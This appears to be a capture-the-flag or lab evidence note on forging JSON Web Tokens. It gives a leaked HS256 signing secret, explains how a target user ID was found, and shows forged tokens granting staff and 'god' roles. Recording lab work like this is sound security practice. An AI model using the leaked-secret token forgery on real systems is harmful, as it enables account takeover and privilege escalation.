# Evidence — JWT decode / forge

- **Secret (passphrase):** `42network` — leaked in HTML page comments.
- **`sub`** = user ID — obtained via forum → wil's post → his profile URL.

## wil (staff)
```json
{ "alg": "HS256", "typ": "JWT" }
{ "sub": "k1asdfeditojrb4", "login": "wil", "role": "staff", "exp": 1791332489 }
```
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJrMWFzZGZlZGl0b2pyYjQiLCJsb2dpbiI6IndpbCIsInJvbGUiOiJzdGFmZiIsImV4cCI6MTc5MTMzMjQ4OX0.HHnmW9w7RmQVlnvMV9T1d1eyBNC_Y6WqXu04VkqGIs4
```

## sophie (god)
```json
{ "sub": "enplwhu8jfo56oi", "login": "sophie", "role": "god", "exp": 1791332489 }
```
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJlbnBsd2h1OGpmbzU2b2kiLCJsb2dpbiI6InNvcGhpZSIsInJvbGUiOiJnb2QiLCJleHAiOjE3OTEzMzI0ODl9.U2Hj4hrZJ0moUR6Cky3NLisbbutSiTUeO6sOJzUq_pk
```
